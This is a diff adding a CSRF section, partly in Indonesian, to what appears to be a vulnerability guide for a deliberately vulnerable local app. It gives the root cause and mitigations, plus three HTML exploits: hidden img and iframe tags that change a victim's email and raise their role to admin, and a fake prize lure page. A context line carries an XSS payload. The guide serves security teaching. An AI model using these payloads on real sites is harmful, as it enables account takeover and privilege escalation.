@@ -496,6 +496,51 @@ http://localhost:3001/api/redirect?url="><script>alert(1)</script>
 
 ---
 
+### 20. Cross-Site Request Forgery (CSRF) — `OWASP A01:2021`
+
+| Property | Value |
+|----------|-------|
+| **Endpoint** | `GET /api/user/profile-update?email=...&role=...`, `PUT /api/user/update` |
+| **Root Cause** | No CSRF token; cookie auth with `SameSite=None`; state-changing GET endpoint |
+| **Impact** | Attacker can change victim's email, role, or other profile data |
+
+**Apa yang salah:**
+- `session_token` cookie dikirim otomatis oleh browser pada cross-site requests (`SameSite=None`)
+- `verifyToken` middleware menerima autentikasi via cookie — tidak perlu Authorization header
+- Endpoint `/api/user/profile-update` menerima **GET request** dengan query parameters (state-changing via GET)
+- Tidak ada CSRF token atau validasi `Origin`/`Referer` header
+
+**Exploit 1 — Ubah email korban via `<img>` tag:**
+```html
+<!-- Korban membuka halaman attacker, email langsung berubah -->
+<img src="http://localhost:3001/api/user/profile-update?email=hacker@evil.com" style="display:none" />
+```
+
+**Exploit 2 — Privilege escalation via hidden image:**
+```html
+<!-- Korban menjadi admin tanpa interaksi -->
+<img src="http://localhost:3001/api/user/profile-update?role=admin" />
+```
+
+**Exploit 3 — Full attack page (host di server attacker):**
+```html
+<html>
+<body>
+  <h1>🎉 Congratulations! You won a prize!</h1>
+  <img src="http://localhost:3001/api/user/profile-update?email=attacker@evil.com&phone=666" style="display:none" />
+  <iframe src="http://localhost:3001/api/user/profile-update?role=admin" width="0" height="0"></iframe>
+</body>
+</html>
+```
+
+**Cara mitigasi:**
+- Implement CSRF token (Synchronizer Token Pattern)
+- Set cookie `SameSite=Strict` atau `SameSite=Lax`
+- Jangan gunakan GET untuk state-changing operations (gunakan POST/PUT)
+- Validasi `Origin` dan `Referer` headers
+
+---
+
 ## Additional Weaknesses
 
 | Weakness | Location | Description |
